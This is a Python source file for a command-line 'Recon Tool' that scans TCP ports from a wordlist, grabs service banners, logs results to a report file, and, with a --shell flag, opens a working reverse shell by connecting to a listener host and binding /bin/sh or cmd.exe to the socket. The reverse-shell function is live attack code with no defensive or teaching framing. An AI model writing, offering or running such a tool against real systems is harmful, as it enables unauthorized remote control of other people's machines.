import socket
import os
import subprocess
import argparse
import sys
from datetime import datetime


# load ports from file
def load_ports(file):
    ports = []
    try:
        f = open(file, "r")
        for line in f:
            line = line.strip()
            if line.isdigit():
                ports.append(int(line))
        f.close()
    except FileNotFoundError:
        print("error: file not found -", file)
        sys.exit(1)

    if len(ports) == 0:
        print("error: wordlist is empty")
        sys.exit(1)

    return ports


# phase 1 - port scanner
def scan_ports(target, ports):
    open_ports = []
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print("\n--- Starting Port Scan ---")
    print("Target:", target)
    print("Time:", now)
    print("-" * 30)

    report = open("discovery_report.txt", "w")
    report.write("Port Scan Report\n")
    report.write("Target: " + target + "\n")
    report.write("Time: " + now + "\n")
    report.write("-" * 30 + "\n")
    report.flush()

    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()

        t = datetime.now().strftime("%H:%M:%S")

        if result == 0:
            print(f"Scanning port {port}... OPEN")
            open_ports.append(port)
            status = "OPEN"
        else:
            print(f"Scanning port {port}... CLOSED")
            status = "CLOSED"

        report.write(f"[{t}] port {port} - {status}\n")
        report.flush()

    print("-" * 30)
    print(f"Done. {len(open_ports)} port(s) open\n")

    report.write("-" * 30 + "\n")
    report.write(f"open ports: {open_ports}\n")
    report.write(f"total checked: {len(ports)}\n")
    report.flush()
    report.close()

    return open_ports


# phase 2 - banner grabbing
def grab_banner(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target, port))

        if port in [80, 8080, 8000]:
            s.send(b"GET / HTTP/1.0\r\n\r\n")

        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        s.close()
        return banner

    except socket.timeout:
        return "no banner (timeout)"
    except Exception as e:
        return "no banner"


def run_banners(target, open_ports):
    if not open_ports:
        print("no open ports to grab banners from")
        return

    print("--- Banner Grabbing ---")

    report = open("discovery_report.txt", "a")
    report.write("\nBanner Grabbing\n")
    report.write("-" * 30 + "\n")

    for port in open_ports:
        banner = grab_banner(target, port)
        print(f"port {port}: {banner[:60]}")
        report.write(f"port {port}: {banner}\n")

    report.close()
    print()


# phase 3 - reverse shell
def reverse_shell(lhost, lport):
    print(f"connecting to {lhost}:{lport} ...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
    except Exception as e:
        print("connection failed:", e)
        sys.exit(1)

    print("connected! starting shell...")

    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    if os.name == "nt":
        subprocess.call(["cmd.exe"])
    else:
        subprocess.call(["/bin/sh", "-i"])


# phase 4 - argument parser
def get_args():
    parser = argparse.ArgumentParser(description="Recon Tool - port scanner and remote access")

    parser.add_argument("-t", "--target", required=True, help="target ip address")
    parser.add_argument("-w", "--wordlist", required=True, help="path to ports wordlist file")
    parser.add_argument("--shell", action="store_true", help="enable reverse shell mode")
    parser.add_argument("--lhost", help="listener ip (needed with --shell)")
    parser.add_argument("--lport", type=int, help="listener port (needed with --shell)")

    args = parser.parse_args()

    if args.shell:
        if not args.lhost or not args.lport:
            print("error: --lhost and --lport required when using --shell")
            sys.exit(1)

    return args


# main
def main():
    args = get_args()

    print("=" * 35)
    print("  Recon Tool")
    print("=" * 35)

    ports = load_ports(args.wordlist)
    open_ports = scan_ports(args.target, ports)
    run_banners(args.target, open_ports)

    if args.shell:
        reverse_shell(args.lhost, args.lport)


if __name__ == "__main__":
    main()
